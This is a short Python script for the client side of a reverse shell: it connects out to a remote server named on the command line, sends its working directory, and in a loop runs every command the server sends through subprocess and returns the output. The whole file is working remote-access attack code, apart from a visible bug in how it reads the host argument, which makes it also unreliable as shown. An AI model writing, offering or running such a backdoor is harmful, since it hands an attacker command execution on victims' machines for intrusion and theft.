import socket
import os
import subprocess
import sys

server_host = sys.argv(1)
server_port = 5003

# 128kb is the max size of messages and relatively easy to increas based on your choice
buffer_size = 1024 *128

# separator string for sending two messages at a go
separator = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((server_host, server_port))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # receive the command from the server
    command = s.recv(buffer_size).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = f"{output}{separator}{cwd}"
    s.send(message.encode())
# close client connection
s.close()